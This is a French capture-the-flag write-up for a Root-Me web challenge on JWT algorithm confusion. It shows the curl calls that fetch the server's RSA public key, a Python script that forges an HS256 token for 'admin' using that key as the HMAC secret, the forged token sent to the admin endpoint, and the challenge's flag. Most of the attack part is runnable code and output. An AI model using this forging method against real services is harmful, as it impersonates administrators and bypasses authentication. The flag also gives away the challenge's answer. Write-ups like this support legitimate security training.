
```
target: http://challenge01.root-me.org/web-serveur/ch60/
vulnerability: JWT Algorithm Confusion (Key Jacking)
flag: "HardcodeYourAlgoBro"
```
**Objectif :** Usurper l'identité de l'utilisateur `admin` via une confusion d'algorithme JWT pour accéder à l'interface d'administration.

# Confusion d'Algorithme JWT

L'application valide initialement les jetons en utilisant l'algorithme asymétrique **`RS256`** et expose sa clé publique. La faille consiste à modifier l'en-tête en **`HS256`** (symétrique) pour forcer le serveur à utiliser sa propre clé publique textuelle comme clé secrète HMAC.

## Mécanisme d'exploitation

Le payload modifie l'algorithme dans le header et définit le nom d'utilisateur à `admin`. La signature est calculée en utilisant la clé publique du serveur (avec son saut de ligne final `\n`) comme secret symétrique.

### Structure du Jeton Forgé

- **Header :** `{"alg":"HS256","typ":"JWT"}`
- **Payload :** `{"username":"admin"}`

## Étape 1 : Récupérer la clé publique du serveur

L'application expose sa clé publique sur un endpoint dédié.

```bash
curl -s [http://challenge01.root-me.org/web-serveur/ch60/key](http://challenge01.root-me.org/web-serveur/ch60/key)

```

Conserver la clé publique RSA PEM obtenue.

## Étape 2 : Générer le jeton forgé

Le serveur stockant sa clé avec un saut de ligne final (`\n`), il faut signer le jeton en intégrant ce caractère.

Créer un fichier `exploit.py` :

```python
import hmac, hashlib, base64

key = (
    "-----BEGIN PUBLIC KEY-----\n"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtjD7bRaA08vLNiMaBHe5\n"
    "NbEWEZvlVKbEoXTL/mtUUwQZpUu6uhhzdA3LgGScRt8r7zzBKIUbAZHKAfNJzugT\n"
    "Fb/KnXdGVjP48bpLbdaWWmArqYfBJOkTdcRJ51X605NVVZID80DnVgeKSr4w2/Km\n"
    "yQAYtNnBJuB7opR532Kyl1sa0vwtnFRkYEN2wZLME86K/PUQI59TmHrtE2lIcWMI\n"
    "//bsEUolbnBJFhi37rEsKFOm4HPn3DC2p3ZJADVckJAIRKOk2i0JK1lX+uk3kHMr\n"
    "FHJERQHQnuFbuJuYgsZkPpg/mvgTgyPbuu/53goQuIPPahJJZPajbXCaBDiC/0qi\n"
    "7wIDAQAB\n"
    "-----END PUBLIC KEY-----\n"
)

msg = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0"

sig = hmac.new(key.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).digest()
token = f"{msg}.{base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')}"
print(token)

```

Exécuter le script :

```bash
python3 exploit.py

```

**Résultat obtenu :** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.XiGqfHhgn_hSIeNlRoq9eoNDk2D8nqCT7NQvDinIxak`

## Étape 3 : Injecter le payload

Envoyer le jeton généré dans l'en-tête `Authorization` de la requête vers l'URL d'administration.

```bash
curl -s -X POST [http://challenge01.root-me.org/web-serveur/ch60/admin](http://challenge01.root-me.org/web-serveur/ch60/admin) \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.XiGqfHhgn_hSIeNlRoq9eoNDk2D8nqCT7NQvDinIxak"

```

## Étape 4 : Récupérer le flag

Le serveur valide la signature et renvoie le flag.

**Réponse reçue :**

```json
{"result": "Congrats !! Here is your flag : HardcodeYourAlgoBro\n"}

```

* **Flag récupéré :** `HardcodeYourAlgoBro`
* **Statut :** Résolu 🟩


## Conclusion

Ce laboratoire montre l’utilisation d’une **Confusion d'Algorithme JWT**.
L’attaque permet :

* Le passage de privilèges à `admin` sans possession de la clé privée.
* Le contournement du chiffrement asymétrique initial (`RS256` -> `HS256`).
* La récupération directe du flag en une seule requête sans force brute.
